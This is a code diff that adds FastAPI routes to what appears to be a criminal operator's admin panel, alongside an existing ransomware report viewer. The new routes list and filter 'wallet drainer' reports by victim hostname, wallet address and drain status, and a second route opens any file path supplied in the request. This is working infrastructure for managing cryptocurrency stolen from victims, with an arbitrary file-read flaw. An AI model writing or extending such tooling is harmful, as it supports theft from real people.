@@ -1943,3 +1943,44 @@ async def ransomware_view_report(request: Request, path: str):
     with open(path, 'r') as f:
         data = json.load(f)
     return HTMLResponse(f"<pre>{json.dumps(data, indent=2, ensure_ascii=False)}</pre>")
+
+@app.get("/wallet_drainer_admin", response_class=HTMLResponse)
+async def wallet_drainer_admin(request: Request, hostname: str = "", address: str = "", status: str = ""):
+    # Сканируем отчеты
+    reports = []
+    base_dir = os.path.join("extracted_data", "crypto")
+    for root, dirs, files in os.walk(base_dir):
+        for file in files:
+            if file.endswith("wallet_drainer_report.json"):
+                try:
+                    with open(os.path.join(root, file), 'r') as f:
+                        data = json.load(f)
+                        if hostname and hostname.lower() not in data.get("victim", {}).get("hostname", "").lower():
+                            continue
+                        # Фильтрация по адресу и статусу
+                        filtered_wallets = []
+                        for w in data.get("wallets", []):
+                            if address and address.lower() not in w.get("address", "").lower():
+                                continue
+                            if status and w.get("drain_result", {}).get("status") != status:
+                                continue
+                            filtered_wallets.append(w)
+                        if filtered_wallets:
+                            data["wallets"] = filtered_wallets
+                            data["report_file"] = os.path.join(root, file)
+                            reports.append(data)
+                        elif not address and not status:
+                            data["report_file"] = os.path.join(root, file)
+                            reports.append(data)
+                except Exception:
+                    continue
+    reports.sort(key=lambda x: x.get("timestamp", ""), reverse=True)
+    return templates.TemplateResponse("wallet_drainer_admin.html", {"request": request, "reports": reports})
+
+@app.get("/wallet_drainer_admin/view_report", response_class=HTMLResponse)
+async def wallet_drainer_view_report(request: Request, path: str):
+    if not os.path.exists(path):
+        return HTMLResponse("<h3>Report not found</h3>", status_code=404)
+    with open(path, 'r') as f:
+        data = json.load(f)
+    return HTMLResponse(f"<pre>{json.dumps(data, indent=2, ensure_ascii=False)}</pre>")
